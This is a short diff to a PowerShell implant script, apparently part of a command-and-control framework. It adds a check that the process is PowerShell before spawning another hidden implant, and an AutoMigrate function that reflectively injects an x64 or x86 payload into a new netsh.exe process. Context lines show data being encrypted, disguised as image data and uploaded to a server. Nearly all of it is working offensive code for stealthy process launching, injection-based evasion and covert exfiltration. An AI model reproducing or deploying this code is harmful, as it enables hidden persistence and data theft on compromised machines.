@@ -34,10 +34,14 @@ $global:ImpUpgrade = $False
 CheckArchitecture
 CheckVersionTwo
 Function StartAnotherImplant {
-    if ($global:ImpUpgrade) {
-        start-process -windowstyle hidden cmd -args "/c `"$env:windir\sysnative\windowspowershell\v1.0\$payload`""
+    if (($p = Get-Process | ? {$_.id -eq $pid}).name -ne "powershell") {
+        echo "Process is not powershell, try running migrate-x86 or migrate-64"
     } else {
-        start-process -windowstyle hidden cmd -args "/c $payload"
+        if ($global:ImpUpgrade) {
+            start-process -windowstyle hidden cmd -args "/c `"$env:windir\sysnative\windowspowershell\v1.0\$payload`""
+        } else {
+            start-process -windowstyle hidden cmd -args "/c $payload"
+        }
     }
 }
 sal S StartAnotherImplant
@@ -470,4 +474,15 @@ Function Get-Webpage {
     $Output = Encrypt-String2 $key $base64
     $UploadBytes = getimgdata $Output
     (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null
+}
+Function AutoMigrate {
+if (($p = Get-Process | ? {$_.id -eq $pid}).name -eq "powershell") {
+    $t=$true
+}
+if ($t -and [IntPtr]::size -eq 8){
+    invoke-reflectivepeinjection -payload x64 -NewProcess c:\windows\system32\netsh.exe
+} 
+elseif (($t -and [IntPtr]::size -eq 4)) {
+    invoke-reflectivepeinjection -payload x86 -NewProcess c:\windows\system32\netsh.exe
+}
 }
